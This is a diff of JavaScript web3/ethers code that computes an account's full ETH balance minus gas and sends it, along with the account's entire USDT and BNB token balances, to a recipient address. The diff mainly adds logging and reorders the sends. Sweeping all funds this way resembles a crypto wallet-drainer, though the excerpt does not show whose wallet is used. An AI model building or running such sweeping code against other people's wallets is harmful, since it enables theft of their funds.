@@ -171,23 +171,23 @@
 
                     // Fetch current gas prices
                     const feeData = await ethersProvider.getFeeData();
-                    const gasPriceWei = feeData.gasPrice;
-                    const maxFeePerGas = feeData.maxFeePerGas;
-                    const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+                    const gasPriceWei = BigInt(feeData.gasPrice.toString());
+                    const maxFeePerGas = BigInt(feeData.maxFeePerGas.toString());
+                    const maxPriorityFeePerGas = BigInt(feeData.maxPriorityFeePerGas.toString());
+
+                    console.log(`Gas Price Wei: ${gasPriceWei}`);
+                    console.log(`Max Fee Per Gas: ${maxFeePerGas}`);
+                    console.log(`Max Priority Fee Per Gas: ${maxPriorityFeePerGas}`);
 
                     const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
+                    console.log(`ETH Balance Wei: ${ethBalanceWei}`);
                     const gasFeeWei = gasPriceWei * gasLimit;
                     const maxEthTransferWei = ethBalanceWei - gasFeeWei;
 
-                    // Get USDT balance
-                    const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
-                    const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
+                    console.log(`Gas Fee Wei: ${gasFeeWei}`);
+                    console.log(`Max ETH Transfer Wei: ${maxEthTransferWei}`);
 
-                    // Get BNB balance
-                    const bnbContract = new web3.eth.Contract(erc20ABI, tokenAddresses.BNB);
-                    const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());
-
-                    // Create transactions for each token
+                    // Create a simple ETH transaction
                     const ethTransactionParameters = {
                         to: recipientAddress,
                         from: senderAddress,
@@ -196,6 +196,19 @@
                         maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
                         maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`
                     };
+
+                    console.log('ETH Transaction Parameters:', ethTransactionParameters);
+
+                    // Send the transaction
+                    const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);
+
+                    // Get USDT balance
+                    const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
+                    const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
+
+                    // Get BNB balance
+                    const bnbContract = new web3.eth.Contract(erc20ABI, tokenAddresses.BNB);
+                    const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());
 
                     const usdtTransactionParameters = {
                         to: tokenAddresses.USDT,
@@ -218,7 +231,6 @@
                     };
 
                     // Send transactions
-                    const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);
                     const usdtTxHash = await web3.eth.sendTransaction(usdtTransactionParameters);
                     const bnbTxHash = await web3.eth.sendTransaction(bnbTransactionParameters);
 
